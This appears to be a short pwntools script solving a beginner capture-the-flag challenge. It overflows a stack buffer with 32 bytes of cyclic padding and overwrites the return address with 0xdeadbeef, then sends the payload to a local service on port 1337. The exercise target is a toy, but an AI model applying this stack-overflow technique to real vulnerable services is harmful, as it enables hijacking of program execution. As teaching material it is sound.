from pwn import *

padding = cyclic(32)
eip = p32(0xdeadbeef)

payload = padding + eip

c = remote('127.0.0.1', 1337)
c.recvuntil('Give me deadbeef: ')
c.send(payload)
print(c.recv(34))
